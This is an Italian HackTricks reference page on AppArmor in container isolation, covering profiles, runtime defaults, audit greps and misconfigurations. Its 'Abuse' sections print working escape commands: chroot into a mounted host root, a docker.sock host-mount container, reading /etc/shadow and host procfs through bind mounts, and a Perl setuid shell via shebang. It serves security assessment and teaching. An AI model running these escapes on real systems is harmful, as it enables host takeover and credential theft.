# AppArmor

{{#include ../../../../banners/hacktricks-training.md}}

## Panoramica

AppArmor è un sistema di **Mandatory Access Control** che applica restrizioni tramite profili specifici per ogni programma. A differenza dei controlli DAC tradizionali, che dipendono fortemente dalla proprietà di utenti e gruppi, AppArmor consente al kernel di applicare una policy associata direttamente al processo. Negli ambienti container, questo è importante perché un workload può avere privilegi tradizionali sufficienti per tentare un'azione e vedersela comunque negare perché il suo profilo AppArmor non consente l'accesso al percorso, il mount, il comportamento di rete o l'utilizzo della capability interessati.

Il punto concettuale più importante è che AppArmor è **basato sui percorsi**. Considera l'accesso al filesystem attraverso regole sui percorsi, invece che tramite label come fa SELinux. Questo lo rende accessibile e potente, ma significa anche che bind mounts e layout alternativi dei percorsi richiedono particolare attenzione. Se lo stesso contenuto dell'host diventa raggiungibile attraverso un percorso diverso, l'effetto della policy potrebbe non essere quello inizialmente previsto dall'operatore.

## Ruolo Nell'isolamento Dei Container

Le revisioni della sicurezza dei container spesso si fermano alle capabilities e a seccomp, ma AppArmor continua a essere importante anche dopo questi controlli. Immagina un container con più privilegi del dovuto, oppure un workload che per ragioni operative necessitava di una capability aggiuntiva. AppArmor può comunque limitare l'accesso ai file, il comportamento dei mount, il networking e i pattern di esecuzione in modi che bloccano il percorso di abuso più ovvio. Per questo disabilitare AppArmor "solo per far funzionare l'applicazione" può trasformare silenziosamente una configurazione semplicemente rischiosa in una attivamente sfruttabile.

## Laboratorio

Per verificare se AppArmor è attivo sull'host, usa:
```bash
aa-status 2>/dev/null || apparmor_status 2>/dev/null
cat /sys/module/apparmor/parameters/enabled 2>/dev/null
```
Per vedere in quale contesto viene eseguito il processo del container corrente:
```bash
docker run --rm ubuntu:24.04 cat /proc/self/attr/current
docker run --rm --security-opt apparmor=unconfined ubuntu:24.04 cat /proc/self/attr/current
```
La differenza è istruttiva. Nel caso normale, il processo dovrebbe mostrare un contesto AppArmor associato al profilo scelto dal runtime. Nel caso unconfined, quel livello aggiuntivo di restrizione scompare.

Puoi anche verificare cosa Docker ritiene di aver applicato:
```bash
docker inspect <container> | jq '.[0].AppArmorProfile'
```
## Utilizzo a runtime

Docker può applicare un profilo AppArmor predefinito o personalizzato quando l'host lo supporta. Podman può inoltre integrarsi con AppArmor nei sistemi basati su AppArmor, sebbene nelle distribuzioni incentrate su SELinux l'altro sistema MAC assuma spesso un ruolo centrale. Kubernetes può esporre la policy AppArmor a livello di workload sui nodi che supportano effettivamente AppArmor. Anche LXC e i relativi ambienti Ubuntu-family per system-container utilizzano ampiamente AppArmor.

Il punto pratico è che AppArmor non è una "feature di Docker". È una funzionalità del kernel dell'host che diversi runtime possono scegliere di applicare. Se l'host non lo supporta o il runtime viene configurato per l'esecuzione unconfined, la protezione presunta non è realmente presente.

In Kubernetes, nello specifico, l'API moderna è `securityContext.appArmorProfile`. A partire da Kubernetes `v1.30`, le precedenti annotazioni beta di AppArmor sono deprecate. Sugli host supportati, `RuntimeDefault` è il profilo predefinito, mentre `Localhost` punta a un profilo che deve essere già caricato sul nodo. Questo è importante durante la revisione, perché un manifest può sembrare compatibile con AppArmor pur dipendendo interamente dal supporto del nodo e dai profili precaricati.

Un dettaglio operativo sottile ma utile è che impostare esplicitamente `appArmorProfile.type: RuntimeDefault` è più restrittivo rispetto alla semplice omissione del campo. Se il campo è impostato esplicitamente e il nodo non supporta AppArmor, l'admission dovrebbe fallire. Se il campo viene omesso, il workload potrebbe comunque essere eseguito su un nodo senza AppArmor e semplicemente non ricevere quel livello aggiuntivo di confinamento. Dal punto di vista di un attacker, questo è un buon motivo per controllare sia il manifest sia lo stato effettivo del nodo.

Sugli host Docker-capable con AppArmor, il profilo predefinito più noto è `docker-default`. Questo profilo viene generato dal template AppArmor di Moby ed è importante perché spiega perché alcuni PoC basati sulle capability continuano a fallire in un container predefinito. In termini generali, `docker-default` consente il networking ordinario, nega le scritture in gran parte di `/proc`, nega l'accesso alle parti sensibili di `/sys`, blocca le operazioni di mount e limita ptrace, impedendogli di essere una primitiva generica per sondare l'host. Comprendere questa baseline aiuta a distinguere tra "il container ha `CAP_SYS_ADMIN`" e "il container può effettivamente utilizzare questa capability contro le interfacce del kernel che mi interessano".

## Gestione dei profili

I profili AppArmor sono generalmente memorizzati in `/etc/apparmor.d/`. Una convenzione comune per i nomi consiste nel sostituire gli slash presenti nel percorso dell'eseguibile con dei punti. Ad esempio, un profilo per `/usr/bin/man` viene comunemente memorizzato come `/etc/apparmor.d/usr.bin.man`. Questo dettaglio è importante sia per la difesa sia per l'assessment, perché una volta noto il nome del profilo attivo, spesso è possibile individuare rapidamente il file corrispondente sull'host.

Tra i comandi utili per la gestione lato host ci sono:
```bash
aa-status
aa-enforce
aa-complain
apparmor_parser
aa-genprof
aa-logprof
aa-mergeprof
```
Il motivo per cui questi comandi sono importanti in un riferimento sulla container security è che spiegano come i profili vengono effettivamente creati, caricati, impostati in complain mode e modificati dopo le modifiche all'applicazione. Se un operatore ha l'abitudine di impostare i profili in complain mode durante il troubleshooting e dimentica di ripristinare l'enforcement, il container può sembrare protetto nella documentazione, pur comportandosi in modo molto più permissivo nella realtà.

### Creazione e aggiornamento dei profili

`aa-genprof` può osservare il comportamento dell'applicazione e aiutare a generare un profilo in modo interattivo:
```bash
sudo aa-genprof /path/to/binary
/path/to/binary
```
`aa-easyprof` può generare un profilo modello che in seguito può essere caricato con `apparmor_parser`:
```bash
sudo aa-easyprof /path/to/binary
sudo apparmor_parser -a /etc/apparmor.d/path.to.binary
```
Quando il binario cambia e la policy deve essere aggiornata, `aa-logprof` può riprodurre i dinieghi rilevati nei log e aiutare l'operatore a decidere se consentirli o negarli:
```bash
sudo aa-logprof
```
### Log

I dinieghi di AppArmor sono spesso visibili tramite `auditd`, syslog o strumenti come `aa-notify`:
```bash
sudo aa-notify -s 1 -v
```
Questo è utile a livello operativo e offensivo. I defender lo usano per perfezionare i profili. Gli attacker lo usano per capire quale percorso o operazione esatto viene negato e se AppArmor è il controllo che blocca una exploit chain.

### Identificare il file del profilo esatto

Quando un runtime mostra un nome specifico del profilo AppArmor per un container, spesso è utile associare quel nome al file del profilo sul disco:
```bash
docker inspect <container> | grep AppArmorProfile
find /etc/apparmor.d/ -maxdepth 1 -name '*<profile-name>*' 2>/dev/null
```
Questo è particolarmente utile durante la revisione lato host perché colma il divario tra "il container dichiara di essere in esecuzione sotto il profilo `lowpriv`" e "le regole effettive si trovano in questo specifico file, che può essere sottoposto ad audit o ricaricato".

### Regole ad alto segnale da sottoporre ad audit

Quando puoi leggere un profilo, non fermarti alle semplici righe `deny`. Diversi tipi di regole modificano sostanzialmente l'efficacia di AppArmor contro un tentativo di container escape:

- `ux` / `Ux`: eseguono il binary di destinazione senza restrizioni. Se un helper, una shell o un interpreter raggiungibile è consentito tramite `ux`, questa è solitamente la prima cosa da testare.
- `px` / `Px` e `cx` / `Cx`: eseguono transizioni di profilo durante `exec`. Non sono automaticamente problematici, ma meritano un audit perché una transizione potrebbe portare a un profilo molto più permissivo di quello corrente.
- `change_profile`: consente a un task di passare a un altro profilo caricato, immediatamente o al prossimo `exec`. Se il profilo di destinazione è più debole, questo può diventare l'escape hatch previsto per uscire da un dominio restrittivo.
- `flags=(complain)`, `flags=(unconfined)` o le più recenti `flags=(prompt)`: queste opzioni dovrebbero modificare il livello di trust che riponi nel profilo. `complain` registra i dinieghi invece di applicarli, `unconfined` rimuove il boundary e `prompt` dipende da un percorso decisionale in userspace anziché da un deny applicato esclusivamente dal kernel.
- `userns` o `userns create,`: le policy AppArmor più recenti possono mediare la creazione di user namespace. Se un profilo del container lo consente esplicitamente, gli user namespace annidati restano possibili anche quando la piattaforma utilizza AppArmor come parte della propria strategia di hardening.

Grep utile lato host:
```bash
grep -REn '(^|[[:space:]])(ux|Ux|px|Px|cx|Cx|pix|Pix|cix|Cix|pux|PUx|cux|CUx|change_profile|userns)\b|flags=\(.*(complain|unconfined|prompt).*\)' /etc/apparmor.d 2>/dev/null
```
Questo tipo di audit è spesso più utile che esaminare centinaia di normali regole sui file. Se un breakout dipende dall'esecuzione di un helper, dall'ingresso in un nuovo namespace o dall'escape verso un profilo meno restrittivo, la risposta spesso è nascosta in queste regole orientate alle transizioni, anziché nelle ovvie righe in stile `deny /etc/shadow r`.

## Misconfigurations

L'errore più evidente è `apparmor=unconfined`. Gli amministratori lo impostano spesso durante il debugging di un'applicazione che ha smesso di funzionare perché il profilo ha bloccato correttamente qualcosa di pericoloso o imprevisto. Se il flag rimane in produzione, l'intero livello MAC è stato di fatto rimosso.

Un altro problema più sottile consiste nel presumere che i bind mounts siano innocui perché i permessi dei file sembrano normali. Poiché AppArmor è basato sui path, l'esposizione dei path dell'host in percorsi di mount alternativi può interagire negativamente con le regole basate sui path. Un terzo errore consiste nel dimenticare che il nome di un profilo in un file di configurazione significa ben poco se il kernel dell'host non sta effettivamente applicando AppArmor.

## Abuse

Quando AppArmor non è più attivo, le operazioni precedentemente vincolate potrebbero improvvisamente funzionare: leggere path sensibili attraverso bind mounts, accedere a parti di procfs o sysfs che avrebbero dovuto essere più difficili da utilizzare, eseguire azioni relative ai mount se anche capabilities/seccomp lo consentono oppure usare path che un profilo normalmente negherebbe. AppArmor è spesso il meccanismo che spiega perché un tentativo di breakout basato sulle capabilities "dovrebbe funzionare" sulla carta, ma continua a fallire nella pratica. Rimuovendo AppArmor, lo stesso tentativo potrebbe iniziare ad avere successo.

Se sospetti che AppArmor sia il principale elemento che impedisce una catena di abuso basata su path-traversal, bind mount o mount, il primo passaggio consiste generalmente nel confrontare ciò che diventa accessibile con e senza un profilo. Ad esempio, se un path dell'host è montato all'interno del container, inizia verificando se puoi attraversarlo e leggerlo:
```bash
cat /proc/self/attr/current
find /host -maxdepth 2 -ls 2>/dev/null | head
find /host/etc -maxdepth 1 -type f 2>/dev/null | head
```
Se il container dispone anche di una capability pericolosa come `CAP_SYS_ADMIN`, uno dei test più pratici consiste nel verificare se AppArmor è il controllo che blocca le operazioni di mount o l'accesso a filesystem kernel sensibili:
```bash
capsh --print | grep cap_sys_admin
mount | head
mkdir -p /tmp/testmnt
mount -t proc proc /tmp/testmnt 2>/dev/null || echo "mount blocked"
mount -t tmpfs tmpfs /tmp/testmnt 2>/dev/null || echo "tmpfs blocked"
```
In ambienti in cui un percorso dell'host è già disponibile tramite un bind mount, la perdita di AppArmor può inoltre trasformare un problema di information disclosure in sola lettura in un accesso diretto ai file dell'host:
```bash
ls -la /host/root 2>/dev/null
cat /host/etc/shadow 2>/dev/null | head
find /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
```
Il punto di questi comandi non è che AppArmor da solo crei il breakout. È che, una volta rimosso AppArmor, molti percorsi di abuso basati su filesystem e mount diventano immediatamente testabili.

### Esempio completo: AppArmor disabilitato + root dell'host montata

Se il container ha già la root dell'host montata tramite bind mount in `/host`, la rimozione di AppArmor può trasformare un percorso di abuso del filesystem precedentemente bloccato in un completo escape dall'host:
```bash
cat /proc/self/attr/current
ls -la /host
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
Una volta che la shell viene eseguita tramite il filesystem dell'host, il workload ha di fatto oltrepassato il confine del container:
```bash
id
hostname
cat /etc/shadow | head
```
### Esempio completo: AppArmor disabilitato + socket di runtime

Se la vera barriera era AppArmor attorno allo stato del runtime, un socket montato può essere sufficiente per una fuga completa:
```bash
find /host/run /host/var/run -maxdepth 2 -name docker.sock 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Il percorso esatto dipende dal punto di mount, ma il risultato finale è lo stesso: AppArmor non impedisce più l'accesso alla runtime API, e la runtime API può avviare un container in grado di compromettere l'host.

### Esempio completo: bypass del bind-mount basato sul percorso

Poiché AppArmor è basato sui percorsi, la protezione di `/proc/**` non protegge automaticamente gli stessi contenuti host di procfs quando sono raggiungibili tramite un percorso diverso:
```bash
mount | grep '/host/proc'
find /host/proc/sys -maxdepth 3 -type f 2>/dev/null | head -n 20
cat /host/proc/sys/kernel/core_pattern 2>/dev/null
```
L'impatto dipende da cosa viene esattamente montato e dal fatto che il percorso alternativo bypassi anche altri controlli, ma questo pattern è uno dei motivi più chiari per cui AppArmor deve essere valutato insieme al layout dei mount, anziché in isolamento.

### Full Example: Shebang Bypass

La policy di AppArmor a volte prende di mira un percorso dell'interprete in un modo che non tiene pienamente conto dell'esecuzione degli script tramite la gestione degli shebang. Un esempio storico prevedeva l'utilizzo di uno script la cui prima riga indicava un interprete confinato:
```bash
cat <<'EOF' > /tmp/test.pl
#!/usr/bin/perl
use POSIX qw(setuid);
POSIX::setuid(0);
exec "/bin/sh";
EOF
chmod +x /tmp/test.pl
/tmp/test.pl
```
Questo tipo di esempio è importante per ricordare che l’intento del profilo e la semantica effettiva dell’esecuzione possono divergere. Quando si esamina AppArmor negli ambienti container, le catene di interpreti e i percorsi di esecuzione alternativi meritano particolare attenzione.

## Verifiche

L’obiettivo di queste verifiche è rispondere rapidamente a tre domande: AppArmor è abilitato sull’host, il processo corrente è confinato e il runtime ha effettivamente applicato un profilo a questo container?
```bash
cat /proc/self/attr/current                         # Current AppArmor label for this process
aa-status 2>/dev/null                              # Host-wide AppArmor status and loaded/enforced profiles
docker inspect <container> | jq '.[0].AppArmorProfile'   # Profile the runtime says it applied
find /etc/apparmor.d -maxdepth 1 -type f 2>/dev/null | head -n 50   # Host-side profile inventory when visible
cat /sys/kernel/security/apparmor/profiles 2>/dev/null | sort | head -n 50   # Loaded profiles straight from securityfs
grep -REn '(^|[[:space:]])(ux|Ux|px|Px|cx|Cx|pix|Pix|cix|Cix|pux|PUx|cux|CUx|change_profile|userns)\b|flags=\(.*(complain|unconfined|prompt).*\)' /etc/apparmor.d 2>/dev/null
```
Cosa è rilevante qui:

- Se `/proc/self/attr/current` mostra `unconfined`, il workload non beneficia del confinement di AppArmor.
- Se `aa-status` mostra che AppArmor è disabilitato o non caricato, qualsiasi nome di profile nella configurazione del runtime è principalmente cosmetico.
- Se `docker inspect` mostra `unconfined` o un custom profile inatteso, spesso questo è il motivo per cui funziona un percorso di abuso basato sul filesystem o sui mount.
- Se `/sys/kernel/security/apparmor/profiles` non contiene il profile previsto, la configurazione del runtime o dell'orchestrator non è sufficiente da sola.
- Se un profile che dovrebbe essere hardened contiene regole nello stile `ux`, `change_profile` generico, `userns` o `flags=(complain)`, il confine pratico potrebbe essere molto più debole di quanto suggerisca il nome del profile.

Se un container dispone già di privilegi elevati per motivi operativi, lasciare AppArmor abilitato spesso fa la differenza tra un'eccezione controllata e un security failure molto più esteso.

## Impostazioni predefinite del runtime

| Runtime / platform | Stato predefinito | Comportamento predefinito | Indebolimento manuale comune |
| --- | --- | --- | --- |
| Docker Engine | Abilitato per impostazione predefinita sugli host che supportano AppArmor | Utilizza il profile AppArmor `docker-default`, salvo override | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Podman | Dipende dall'host | AppArmor è supportato tramite `--security-opt`, ma il comportamento predefinito esatto dipende dall'host/runtime ed è meno universale rispetto al profile `docker-default` documentato da Docker | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Kubernetes | Predefinito condizionale | Se `appArmorProfile.type` non è specificato, il valore predefinito è `RuntimeDefault`, ma viene applicato solo quando AppArmor è abilitato sul nodo | `securityContext.appArmorProfile.type: Unconfined`, `securityContext.appArmorProfile.type: Localhost` con un profile debole, nodi senza supporto per AppArmor |
| containerd / CRI-O under Kubernetes | Segue il supporto del nodo/runtime | I runtime supportati comunemente da Kubernetes supportano AppArmor, ma l'enforcement effettivo dipende comunque dal supporto del nodo e dalle impostazioni del workload | Come nella riga Kubernetes; la configurazione diretta del runtime può anche evitare completamente AppArmor |

Per AppArmor, la variabile più importante è spesso l'**host**, non solo il runtime. Un'impostazione del profile in un manifest non crea confinement su un nodo in cui AppArmor non è abilitato.

## Riferimenti

- [Security context di Kubernetes: campi del profile AppArmor e comportamento relativo al supporto del nodo](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)
- [Manpage `apparmor.d(5)` di Ubuntu 24.04: exec transitions, `change_profile`, `userns` e profile flags](https://manpages.ubuntu.com/manpages/noble/en/man5/apparmor.d.5.html)
{{#include ../../../../banners/hacktricks-training.md}}
